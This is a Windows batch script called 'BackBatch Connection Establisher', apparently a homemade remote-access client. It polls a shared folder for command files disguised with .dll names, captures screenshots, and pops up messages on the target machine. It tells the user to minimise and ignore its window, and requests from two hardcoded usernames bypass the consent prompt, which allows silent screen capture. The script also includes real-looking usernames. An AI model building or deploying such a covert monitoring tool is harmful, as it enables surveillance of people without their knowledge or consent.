::: BackBatch Connection Establisher
::: By 1k0de

::::::: UNIQUE DEVICE ID - EDITABLE :::::::
set "_currentDeviceID=lib_11"
:::::::::::::::::::::::::::::::::::::::::::

::Set up window
@echo off
title BackBatch CE
cls

setlocal EnableDelayedExpansion

set "wait=ping localhost -n 2 > nul"

set "_ConfirmUsers[0]=karim.dalati1"
set "_ConfirmUsers[1]=adeld"

set "_deviceStorage=__BACK_BATCH_DATA\"
GOTO start

:start
echo.
echo ^ ^> Hello, if for some reason you are seeing this window, just minimize it and ignore it.
echo.
goto _deviceSearch

:_deviceSearch
echo.
echo SEARCHING...
if exist "%_deviceStorage%" (
	if exist "%_deviceStorage%\%_currentDeviceID%" (
		echo ...FOUND^^!
	) else (
		mkdir "%_deviceStorage%\%_currentDeviceID%"
	)
	GOTO _foundDevice
)
%wait%
goto _deviceSearch

:_foundDevice
set "_device=%_deviceStorage%\%_currentDeviceID%"
echo Awaiting Injection...
GOTO await_injection

:await_injection
set "_contents="
if not exist "%_device%\BB_Inject.dll" (
	%wait%
	goto await_injection
)

set /p _contents=<"%_device%\BB_Inject.dll"
del /f /q "%_device%\BB_Inject.dll"

set /a arrLength=0
GOTO get_ConfirmUsers_array_length


:get_ConfirmUsers_array_length
if defined _ConfirmUsers[%arrLength%] (
	set /a arrLength+=1
	GOTO get_ConfirmUsers_array_length
)
goto check_users

:check_users
set "_notifyUser=false"
for /l %%n in (0, 1, %arrLength%) do (
	if "%username%" == "!_ConfirmUsers[%%n]!" (
		set "_notifyUser=true"
	)
)

:: Checks if the user the request is sent from can bypass the confirmation
if "!_contents!" == "karim.dalati1" (
	echo Request sent from elevated user, bypassing user confirmation...
	set "_notifyUser=false"
)
if "!_contents!" == "adeld" (
	echo Request sent from elevated user, bypassing user confirmation...
	set "_notifyUser=false"
)

if "%_notifyUser%" == "true" (
	goto notify_user
)
goto start_injection


:notify_user
echo AWAITING_CONFIRMATION>"%_device%\BB_Response.dll"
echo Sending Notification...
call :send_notif "BackBatch Injection Request" "\"!_contents!\" is trying to connect to your device. Awaiting your confirmation."
echo Requesting Confirmation...

set "_perms="
FOR /f "delims=" %%i IN ('mshta "javascript:var choice=confirm('[BackBatch]: Elevated User\n\n\"!_contents!\" is trying to connect to your device.\nAllow connection?\n\nOk = yes\nCancel = no');new ActiveXObject('Scripting.FileSystemObject').GetStandardStream(1).WriteLine(choice);close()"') do set _perms=%%i

echo PERMISSION_GRANTED: !_perms!

set /p _response2=<"%_device%\BB_Response.dll"

if "!_response2!" == "TIMED_OUT" (
	echo REQUEST_TIMED_OUT
	call :send_notif "BackBatch Request Timed Out" "The request you just approved has been timed out. No connection was established."
	GOTO start
)

if "!_perms!" == "True" (
	echo PERMISSION_GRANTED>"%_device%\BB_Response.dll"
	goto _proceed
) else (
	echo PERMISSION_DENIED>"%_device%\BB_Response.dll"
)

goto start


:start_injection
echo Starting Injection...
echo CONNECTION_ESTABLISHED>"%_device%\BB_Response.dll"
goto _proceed

:_proceed
::::: Get Screen Resolution For Snap Shots
for /f "tokens=4,5 delims=. " %%a in ('ver') do set "version=%%a%%b"

if version lss 62 (
    ::set "wmic_query=wmic desktopmonitor get screenheight, screenwidth /format:value"
    for /f "tokens=* delims=" %%@ in ('wmic desktopmonitor get screenwidth /format:value') do (
        for /f "tokens=2 delims==" %%# in ("%%@") do set "x=%%#"
    )
    for /f "tokens=* delims=" %%@ in ('wmic desktopmonitor get screenheight /format:value') do (
        for /f "tokens=2 delims==" %%# in ("%%@") do set "y=%%#"
    )

) else (
    ::wmic path Win32_VideoController get VideoModeDescription,CurrentVerticalResolution,CurrentHorizontalResolution /format:value
    for /f "tokens=* delims=" %%@ in ('wmic path Win32_VideoController get CurrentHorizontalResolution  /format:value') do (
        for /f "tokens=2 delims==" %%# in ("%%@") do set "x=%%#"
    )
    for /f "tokens=* delims=" %%@ in ('wmic path Win32_VideoController get CurrentVerticalResolution /format:value') do (
        for /f "tokens=2 delims==" %%# in ("%%@") do set "y=%%#"
    )

)
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo AWAITING_COMMANDS
if exist "%_device%\BB_Query.dll" ( del /f /q "%_device%\BB_Query.dll" )
GOTO await_commands

:await_commands
set "_latest="
set "_cmdContent="
set "_notifTitle="
set "_notifText="

if exist "%_device%\BB_Query.dll" (
	echo Found BB_Query.dll
	set /p _latest=<"%_device%\BB_Query.dll"
	goto process_query
)
goto await_commands

:process_query

if "!_latest!" == "__SNAPSCREEN__" (
	echo Snap Shotting screen...
	if exist "%_device%\_snapShot.jpg" ( del /f /q "%_device%\_snapShot.jpg" )
	call :ScreenShot
)

if "!_latest!" == "__ENDCONNECTION__" (
	echo Closing Connection...
	goto start
)

if "!_latest!" == "__MESSAGE__" (
	if not exist "%_device%\BB_cmd_content.dll" (
		echo Message command executed but couldn^'t find content...
		del /f /q "%_device%\BB_Query.dll"
		echo __ERRORSENDINGMESSAGE__>"%_device%\BB_cmd_response.dll"
		goto await_commands
	)
	set /p _cmdContent=<"%_device%\BB_cmd_content.dll"
	goto message_command
)
if "!_latest!" == "__NOTIFICATION__" (
	if not exist "%_device%\BB_notif_title.dll" (
		echo Notification command executed but couldn^'t find title...
		del /f /q "%_device%\BB_Query.dll"
		echo __ERRORSENDINGNOTIFICATION__>"%_device%\BB_cmd_response.dll"
		goto await_commands
	)
	if not exist "%_device%\BB_notif_text.dll" (
		echo Noification command executed but couldn^'t find text...
		del /f /q "%_device%\BB_Query.dll"
		echo __ERRORSENDINGNOTIFICATION__>"%_device%\BB_cmd_response.dll"
		goto await_commands
	)
	set /p _notifTitle=<"%_device%\BB_notif_title.dll"
	set /p _notifText=<"%_device%\BB_notif_text.dll"
	goto notif_command
)
if exist "%_device%\BB_Query.dll" ( del /f /q "%_device%\BB_Query.dll" )
goto await_commands

:message_command
powershell -command "(new-object -com shell.application).minimizeall();
mshta javascript:alert("!_cmdContent!");close();
del /f /q "%_device%\BB_cmd_content.dll"
del /f /q "%_device%\BB_Query.dll"
echo __MESSAGESENT__>"%_device%\BB_cmd_response.dll"
goto await_commands

:notif_command
call :send_notif "!_notifTitle!" "!_notifText!"
del /f /q "%_device%\BB_notif_title.dll"
del /f /q "%_device%\BB_notif_text.dll"
del /f /q "%_device%\BB_Query.dll"
echo __NOTIFICATIONSENT__>"%_device%\BB_cmd_response.dll"
goto await_commands

::----------------------------------------------------------------------------------------------------------------------------
 :ScreenShot
 Powershell ^
 $Path = '%_device%\';^
 Add-Type -AssemblyName System.Windows.Forms;^
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;^
 $image = New-Object System.Drawing.Bitmap(%x%, %y%^);^
 $graphic = [System.Drawing.Graphics]::FromImage($image^);^
 $point = New-Object System.Drawing.Point(0,0^);^
 $graphic.CopyFromScreen($point, $point, $image.Size^);^
 $cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position,[System.Windows.Forms.Cursor]::Current.Size^);^
 [System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds^);^
 $FileName = '_snapShot.jpg';^
 $FilePath = $Path+$FileName;^
 $FormatJPEG = [System.Drawing.Imaging.ImageFormat]::jpeg;^
 $image.Save($FilePath,$FormatJPEG^)
 Exit /B
 ::-------------------------

:send_notif
::Syntaxe : call :notif "Title" "Message"

set type=Information
set "$Titre=%~1"
Set "$Message=%~2"

::You can replace the $Icon value by Information, error, warning and none
Set "$Icon=Information"
for /f "delims=" %%a in ('powershell -c "[reflection.assembly]::loadwithpartialname('System.Windows.Forms');[reflection.assembly]::loadwithpartialname('System.Drawing');$notify = new-object system.windows.forms.notifyicon;$notify.icon = [System.Drawing.SystemIcons]::%$Icon%;$notify.visible = $true;$notify.showballoontip(20,'%$Titre%','%$Message%',[system.windows.forms.tooltipicon]::None)"') do (set $=)
